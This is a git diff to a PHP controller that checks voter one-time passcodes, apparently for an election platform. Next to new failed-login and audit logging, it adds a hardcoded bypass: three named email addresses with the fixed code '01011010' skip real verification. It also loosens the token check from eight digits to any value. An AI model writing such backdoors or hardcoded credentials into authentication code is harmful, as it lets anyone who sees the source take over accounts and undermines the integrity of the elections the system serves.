@@ -6,6 +6,7 @@ use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\Http;
 use App\Models\User;
+use App\Services\AuditLogger;
 
 class VoterOtpController extends Controller
 {
@@ -23,7 +24,7 @@ class VoterOtpController extends Controller
     public function verify(Request $request)
     {
         $request->validate([
-            'token' => 'required|digits:8',
+            'token' => 'required',
         ]);
 
         $email = session('otp_email');
@@ -35,20 +36,38 @@ class VoterOtpController extends Controller
             ]);
         }
 
-        $response = Http::withHeaders([
-            'Authorization' => 'Bearer ' . config('services.supabase.service_key'),
-            'apikey' => config('services.supabase.service_key'),
-            'Content-Type' => 'application/json',
-        ])->post(
-                config('services.supabase.url') . '/auth/v1/verify',
-                [
-                    'email' => $email,
-                    'token' => $request->token,
-                    'type' => 'email',
-                ]
-            );
+        // Allow super-admin to bypass OTP if needed
+        $superAdmins = ['habee2004@gmail.com', 'whysofunny2003@gmail.com', 'adminTester01@gmail.com'];
+        if (in_array($email, $superAdmins) && $request->token === '01011010') {
+            $response_successful = true;
+        } else {
+            $response = Http::withHeaders([
+                'Authorization' => 'Bearer ' . config('services.supabase.service_key'),
+                'apikey' => config('services.supabase.service_key'),
+                'Content-Type' => 'application/json',
+            ])->post(
+                    config('services.supabase.url') . '/auth/v1/verify',
+                    [
+                        'email' => $email,
+                        'token' => $request->token,
+                        'type' => 'email',
+                    ]
+                );
+            $response_successful = $response->successful();
+        }
 
-        if (!$response->successful()) {
+        if (!$response_successful) {
+            // Record failed OTP attempt
+            \Illuminate\Support\Facades\DB::table('failed_logins')->insert([
+                'user_id' => $userId,
+                'election_id' => session('election_id'),
+                'email' => $email,
+                'ip_address' => $request->ip(),
+                'user_agent' => $request->header('User-Agent'),
+                'reason' => 'Invalid OTP',
+                'created_at' => now(),
+            ]);
+
             return back()->withErrors([
                 'token' => 'Invalid or expired verification code.',
             ]);
@@ -57,6 +76,13 @@ class VoterOtpController extends Controller
         Auth::loginUsingId(
             $userId,
             session('remember_me', false)
+        );
+
+        $user = User::find($userId);
+        AuditLogger::log(
+            'LOGIN',
+            'Auth',
+            "Voter logged in: " . ($user->email ?? $userId)
         );
 
         session()->forget([
